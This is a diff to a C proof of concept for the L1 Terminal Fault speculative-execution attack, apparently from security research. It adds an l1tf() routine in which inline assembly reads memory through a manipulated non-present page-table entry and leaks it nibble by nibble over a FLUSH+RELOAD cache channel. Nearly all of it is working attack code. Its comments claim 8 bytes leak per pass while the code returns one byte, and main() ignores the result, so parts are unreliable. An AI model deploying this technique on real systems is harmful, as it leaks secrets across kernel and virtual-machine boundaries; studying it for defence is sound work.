@@ -1,7 +1,10 @@
+#include "asm.h"
 #include "constants.h"
 #include "flush_and_reload.h"
+#include "statistics.h"
 #include <bits/types/siginfo_t.h>
 #include <signal.h>
+#include <stdint.h>
 #include <stdlib.h>
 #include <sys/mman.h>
 #include <ucontext.h>
@@ -26,10 +29,70 @@ static void segfault_handler(int sig, siginfo_t *info, void *ucontext) {
 }
 #pragma GCC diagnostic pop
 
+// The reload buffer will be used to leak 8 bytes at a time.
+// Instead of leaking byte-for-byte, and thus needing a covert
+// channel "resolution" of 2^8 = 256 pages per byte we want to leak,
+// we can leak nibble-for-nibble. This requires just 2^4 = 16 pages
+// per nibble, giving us the ability to leak 256/16 = 16 nibbles = 8 bytes
+// per FLUSH+RELOAD iteration.
+// The tradeoff is that we require a larger speculative window, and need
+// some additional post processing to reconstruct the data.
+#define RELOAD_BUFFER_AMOUNT_OF_PAGES 16 * 2
+#define RELOAD_BUFFER_SIZE RELOAD_BUFFER_AMOUNT_OF_PAGES *PAGE_SIZE
+
+uint8_t l1tf(void *leak_addr, void *reload_buffer, size_t threshold) {
+  size_t raw_results[RELOAD_BUFFER_AMOUNT_OF_PAGES] = {0};
+
+  flush(RELOAD_BUFFER_AMOUNT_OF_PAGES, PAGE_SIZE, reload_buffer);
+
+  // Flush the address of the segfault handler to increase
+  // the length of the speculative window (hopefully?)
+  clflush((void *)segfault_handler);
+  mfence();
+
+  asm volatile("xor %%rax, %%rax\n"
+               "xor %%rbx, %%rbx\n"
+               "movq $0x10000, %%rcx\n"
+               "movb (%[leak_addr]), %%al\n"
+               "movb %%al, %%bl\n"
+               "and $0xf0, %%al\n"
+               "and $0x0f, %%bl\n"
+               "shl $0xc, %%ebx\n"
+               "shl $0x8, %%eax\n"
+               "prefetcht0 (%[reload_buffer], %%rbx)\n"
+               "add %%rcx, %[reload_buffer]\n"
+               "prefetcht0 (%[reload_buffer], %%rax)\n"
+               "mfence\n"
+               "loop:\n"
+               "pause\n"
+               "jmp loop\n"
+               ".global reload_label\n"
+               "reload_label:"
+
+               ::[leak_addr] "r"(leak_addr),
+               [reload_buffer] "r"(reload_buffer)
+               : "rax", "rbx", "rcx");
+
+  reload(RELOAD_BUFFER_AMOUNT_OF_PAGES, PAGE_SIZE, reload_buffer, raw_results,
+         threshold);
+
+  // Reconstruct
+  uint8_t result = 0;
+  for (size_t nibble = 0; nibble < RELOAD_BUFFER_AMOUNT_OF_PAGES / 16;
+       ++nibble) {
+    size_t *partial_results = &raw_results[nibble * 16];
+    size_t max_idx = maximum(16, partial_results);
+    size_t max = partial_results[max_idx];
+    result |= max << (4 * nibble);
+  }
+
+  return result;
+}
+
 int main(int argc, char *argv[argc]) {
   // Step 1: Create a variable
   // Step 2: modify PTE to change make page containing that variable non-present
-  //         optionally modify the PTE physical page
+  //         and modify the PFN
   // Step 3: FLUSH reload buffer
   // Step 4: Speculatively access variable
   // Step 5: RELOAD reload buffer
@@ -55,9 +118,9 @@ int main(int argc, char *argv[argc]) {
 
   void *leak = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
-  void *reload_buffer =
-      mmap(NULL, VALUES_IN_BYTE * PAGE_SIZE, PROT_WRITE | PROT_READ,
-           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+
+  void *reload_buffer = mmap(NULL, RELOAD_BUFFER_SIZE, PROT_WRITE | PROT_READ,
+                             MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
   assert(reload_buffer != MAP_FAILED);
 
   size_t threshold = 150;
@@ -73,7 +136,7 @@ int main(int argc, char *argv[argc]) {
   sa.sa_handler = (void *)segfault_handler;
   sigaction(SIGSEGV, &sa, NULL);
 
-  memset(reload_buffer, 0, VALUES_IN_BYTE * PAGE_SIZE);
+  memset(reload_buffer, 0, RELOAD_BUFFER_SIZE);
 
   size_t start = (phys_addr & 0xfff);
   for (size_t j = start; j < start + length; j += 1) {
@@ -82,23 +145,8 @@ int main(int argc, char *argv[argc]) {
 
     // printf("pfn after set %lx\n", ptedit_pte_get_pfn(leak, 0));
 
-    for (int i = 0; i < 100; ++i) {
-      flush(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer);
-      asm volatile("xor %%rax, %%rax\n"
-                   "movb (%0), %%al\n"
-                   "shl $0xc, %%eax\n"
-                   "prefetcht0 (%1, %%rax)\n"
-                   "mfence\n"
-                   "loop:\n"
-                   "pause\n"
-                   "jmp loop\n"
-                   ".global reload_label\n"
-                   "reload_label:"
-
-                   ::"r"(leak_addr),
-                   "r"(reload_buffer)
-                   : "rax");
-      reload(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer, results, threshold);
+    for (int i = 0; i < 10; ++i) {
+      l1tf(leak_addr, reload_buffer, threshold);
     }
 
     for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
